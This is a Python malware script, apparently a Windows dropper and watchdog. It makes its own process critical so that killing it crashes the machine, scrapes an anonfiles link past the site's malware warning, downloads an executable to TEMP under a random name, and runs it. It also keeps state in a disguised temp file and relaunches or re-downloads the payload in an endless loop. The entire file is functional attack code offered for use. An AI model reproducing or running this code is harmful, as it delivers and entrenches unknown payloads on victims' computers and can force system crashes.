import ctypes

ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0

def drop(link):
    import os, subprocess, requests, random, string, json
    from bs4 import BeautifulSoup
    oldlink = link
    response = requests.get(link)
    header = { # Header
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
    response = requests.get(link) # your anonfiles URL
    html_soup = BeautifulSoup(response.text, 'html.parser') # parse the shit
    data = html_soup.find_all('a', id='download-url') # find the "download-url" value
    if not data: # file is flagged as malicious
        data = html_soup.find_all("input", {"class": "form-control"}) # find the warning field
        link = data[0]['value'] # and get the link for it
    else: # file is clean
        link = data[0]['href'] # our clean link
    randomname = f"{''.join(random.choice(string.ascii_letters) for i in range(6))}.exe"
    for i in range(100): # BC anonfiles is gay, we have to check if it worked lol
        try:
            r = requests.get(link, headers=header, allow_redirects=True) # Download it
            open(os.path.join(os.getenv('TEMP'), randomname), 'wb').write(r.content) # save it in temp
        except:
            print(f"[Download failed]: Attempt #{i} | Anonfiles is gay") #Cry about it failing
            continue # and try again
        break # if it works, stop here
    open(os.path.join(os.getenv('TEMP'), randomname), 'wb').write(r.content)
    subprocess.Popen(f"{os.path.join(os.getenv('TEMP'), randomname)}", shell=True)
    towrite = {'procname' : randomname, 'link' : oldlink, 'procdir' : os.path.join(os.getenv('TEMP'), randomname)}
    with open(os.path.join(os.getenv('TEMP'), 'temp_mei2323.tmp'), 'w+') as f:
        json.dump(towrite, f, indent=4)
    return towrite

import subprocess, time, os, json, requests
from bs4 import BeautifulSoup
with open(os.path.join(os.getenv('TEMP'), 'temp_mei2323.tmp'), 'r') as f:
    data = json.load(f)
link = data['link']
oldlink = link
process_start_dir = data['procdir']
process_name = data['procname']
response = requests.get(link)
html_soup = BeautifulSoup(response.text, 'html.parser')
data = html_soup.find_all('a', id='download-url')
link = data[0]['href']
print(link)

while True:
    time.sleep(0.1)
    isactive = False
    command = 'for /f "tokens=3 usebackq" %i in (`tasklist /fo list ^| find ^"ImageName^"`) do @echo %i'
    output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    tasks = str(output.stdout.decode('CP437'))
    for task in tasks.splitlines():
        if str(task).lower() == str(process_name).lower():
            isactive = True
        else:
            pass
    if not isactive:
        print(process_start_dir)
        if os.path.isfile(process_start_dir):
            try:
                subprocess.Popen(process_start_dir, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            except:
                pass
        else:
            if oldlink != None:
                data = drop(oldlink)
                process_start_dir = data['procdir']
                process_name = data['procname']
            try:
                subprocess.Popen(process_start_dir, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            except:
                pass
